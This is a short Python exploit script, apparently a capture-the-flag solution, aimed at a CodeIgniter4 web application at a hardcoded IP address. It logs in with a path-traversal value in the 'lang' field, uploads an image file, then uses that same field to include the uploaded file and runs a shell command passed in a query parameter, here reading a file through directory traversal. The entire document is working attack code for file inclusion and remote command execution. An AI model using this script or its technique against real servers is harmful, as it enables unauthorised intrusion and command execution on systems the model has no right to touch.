import requests

r = requests.Session()
def Login(user_id,user_pw):
	LoginUrl = 'http://106.240.19.118:7170/index.php/User/Login'
	r1 = r.post(LoginUrl,data={"user_id":user_id,"user_pw":user_pw,"lang":"../../../app/Views/index_asdf123vhsjdf/"})
	session = r1.headers['Set-Cookie'];
def Upload():
	UploadUrl = 'http://106.240.19.118:7170/index.php/Board/Write'
	files = {'userfile':open('asdf.png','rb')}
	r2 = r.post(UploadUrl,data={"subject":"test","contents":"asdf"},files=files)

def exploit(filename,cmd,id,pw):
	LoginUrl = 'http://106.240.19.118:7170/index.php/User/Login'
	r3 = requests.post(LoginUrl+'?0='+cmd,data={"user_id":id,"user_pw":pw,"lang":filename})
	print(r3.text)

#Login('yelang123','yelang123')
#Upload()
exploit('asdf123vhsjdf/1634892518_00ba308a53087c4074c3.png','cat ../../../../../var/www/html/codeigniter4/app/Views/index_asdfasdf/1634892488_498823674751ad207fb6.png','yelang123','yelang123')
